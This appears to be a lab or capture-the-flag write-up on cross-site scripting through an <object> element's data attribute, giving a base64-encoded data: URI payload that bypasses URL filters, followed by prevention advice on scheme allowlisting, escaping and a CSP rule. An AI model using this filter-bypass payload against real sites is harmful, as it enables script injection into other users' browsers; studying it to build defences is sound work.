# XSS via Object Data Attribute

The `/?page=media&src=<url>` page renders user-supplied input as the `data` attribute of an
`<object>` element. The `data:` URI scheme allows injecting arbitrary HTML/JS without any
external fetch, bypassing URL-based filters.

## Exploit

Encode the payload as base64:

```
<script>alert(1)</script>  →  PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

Navigate to:

```
http://<IP>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## How to prevent

- Allowlist only `http` and `https` schemes for the `src` parameter — block `data:`, `javascript:`, etc.
- Escape user input before injecting into HTML attributes
- Disable `<object>` entirely via CSP:
  ```
  Content-Security-Policy: default-src 'self'; object-src 'none';
  ```
